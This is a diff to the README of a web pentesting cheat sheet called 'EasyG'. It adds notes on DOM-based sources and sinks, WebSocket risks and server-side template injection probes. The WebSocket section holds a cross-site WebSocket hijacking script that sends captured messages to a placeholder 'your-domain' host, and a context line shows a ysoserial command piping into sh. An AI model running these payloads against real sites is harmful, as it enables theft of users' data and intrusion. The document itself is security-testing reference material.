@@ -39,8 +39,8 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
   - [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
   - [Clickjacking](#clickjacking)
-  - DOM-based vulnerabilities
-  - Websockets
+  - [DOM-based vulnerabilities](#dom-based-vulnerabilities)
+  - [WebSockets](#websockets)
   - [Insecure deserialization](#insecure-deserialization)
   - [Server-side template injection](#server-side-template-injection)
   - Web cache poisoning
@@ -989,6 +989,70 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 
 
 
+### <ins>DOM-based vulnerabilities</ins>
+
+Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data.
+
+- document.URL
+- document.documentURI
+- document.URLUnencoded
+- document.baseURI
+- location
+- document.cookie
+- document.referrer
+- window.name
+- history.pushState
+- history.replaceState
+- localStorage
+- sessionStorage
+- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+- Database
+
+| DOM-based vulnerability          | Example sink               |
+| -------------------------------- | -------------------------- |
+| DOM XSS                          | document.write()           |
+| Open redirection                 | window.location            |
+| Cookie manipulation              | document.cookie            |
+| JavaScript injection             | eval()                     |
+| Document-domain manipulation     | document.domain            |
+| WebSocket-URL poisoning          | WebSocket()                |
+| Link manipulation                | someElement.src            |
+| Web-message manipulation         | postMessage()              |
+| Ajax request-header manipulation | setRequestHeader()         |
+| Local file-path manipulation     | FileReader.readAsText()    |
+| Client-side SQL injection        | ExecuteSql()               |
+| HTML5-storage manipulation       | sessionStorage.setItem()   |
+| Client-side XPath injection      | document.evaluate()        |
+| Client-side JSON injection       | JSON.parse()               |
+| DOM-data manipulation            | someElement.setAttribute() |
+| Denial of service                | RegExp()                   |
+
+
+
+### WebSockets
+
+Any web security vulnerability might arise in relation to WebSockets:
+- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection;
+- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques;
+- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.
+
+**Cross-site WebSocket hijacking (CSRF missing**
+```
+<script>
+  websocket = new WebSocket('wss://websocket-URL');
+  websocket.onopen = start;
+  websocket.onmessage = handleReply;
+  function start(event) {
+    websocket.send("READY");
+  }
+  function handleReply(event) {
+    fetch('https://your-domain/?'+event.data, {mode: 'no-cors'});
+  }
+</script>
+```
+
+
+
 ### <ins>Insecure deserialization</ins>
 
 **Ysoserial**
@@ -1016,15 +1080,15 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
 - The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
 - Use payloads like these
   ```
-  {{2*2}}[[3*3]]
-  {{3*3}}
-  {{3*'3'}}
-  <%= 3 * 3 %>
-  ${6*6}
-  ${{3*3}}
-  @(6+5)
-  #{3*3}
-  #{ 3 * 3 }
+  {{7*7}}[[3*3]]
+  {{7*7}}
+  {{7*'7'}}
+  <%= 7 * 7 %>
+  ${7*7}
+  ${{7*7}}
+  @(7+7)
+  #{7*7}
+  #{ 7 * 7 }
   ```
 
 **Resource**
